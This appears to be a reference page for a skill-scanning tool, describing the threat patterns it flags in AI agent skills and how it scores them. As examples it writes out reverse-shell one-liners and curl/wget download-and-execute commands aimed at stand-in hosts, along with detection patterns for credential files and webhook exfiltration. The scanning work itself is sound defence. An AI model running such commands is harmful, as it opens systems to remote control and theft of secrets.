# Threat Patterns Reference

Detailed explanation of security patterns detected by ClawHub Skill Scanner.

## 🔴 CRITICAL Patterns

### Reverse Shells
Allow attackers remote access to your system.

| Pattern | Example | Risk |
|---------|---------|------|
| `nc -e` | `nc attacker.com 4444 -e /bin/sh` | Netcat shell |
| `bash -i /dev/tcp` | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` | Bash reverse shell |
| `python socket` | `python -c 'import socket,subprocess...'` | Python shell |

### Curl-Pipe-Bash (Primary ClawHavoc Vector!)
Downloads and executes code in one step — no chance for inspection.

```bash
# DANGEROUS:
curl https://evil.com/install.sh | bash
wget https://evil.com/setup.sh && chmod +x setup.sh && ./setup.sh
```

### Webhook Exfiltration
Sends stolen data to external services.

| Pattern | Target |
|---------|--------|
| `discord.com/api/webhooks` | Discord bot channels |
| `hooks.slack.com` | Slack workspaces |

### Known Malicious Domains
Hosts identified in the ClawHavoc campaign:

- **glot.io** — Code hosting, used for payload delivery
- **pastebin.com/raw** — Often used for obfuscated code
- **paste.ee, ghostbin** — Alternative paste services

### Persistence Mechanisms
Survive system reboots.

| Pattern | Effect |
|---------|--------|
| `crontab -` | Scheduled tasks |
| `/etc/cron` | System cron |
| `systemctl enable` | Systemd service |
| `LaunchAgents` | macOS autostart |
| `.bashrc` | Shell login hook |

### Credential Access
Access to sensitive files.

| Pattern | Target |
|---------|--------|
| `~/.ssh/` | SSH private keys |
| `~/.aws/` | AWS credentials |
| `.clawdbot/.env` | OpenClaw secrets (ClawHavoc target!) |
| `~/.openclaw/credentials` | API keys |

### Obfuscation
Hides malicious code.

| Pattern | Technique |
|---------|-----------|
| `base64 -d \|` | Base64 → Shell |
| `pickle.loads` | Python RCE via deserialization |
| `marshal.loads` | Bytecode execution |

## 🟡 WARNING Patterns

These are not automatically malicious, but suspicious:

- **Raw sockets** — Unusual for most skills
- **Dynamic code compilation** — Could hide malicious code
- **File deletion** — Could remove evidence
- **Screen/keyboard capture** — Spyware indicators

## Scoring Formula

```
CRITICAL × 30 = Base score
WARNING × 3 (max 10) = Warning contribution

Score 0-20:   SAFE      ✅
Score 21-50:  CAUTION   ⚠️
Score 51-80:  DANGER    🔶
Score 81-100: BLOCKED   🔴
```

## False Positives

The scanner may produce false positives for:

- **Documentation** — `sudo apt install` in README files
- **Regex patterns** — `$SYMBOL` for stock tickers
- **Legitimate APIs** — Webhook endpoints in app code
- **Data storage** — `.clawdbot/skills/` for skill data

For CAUTION results: Manually verify if pattern is in code or just documentation.

## Contributing

Found a malicious pattern we don't detect? 
Open an issue at [github.com/amir-ag/clawhub-skill-scanner](https://github.com/amir-ag/clawhub-skill-scanner)
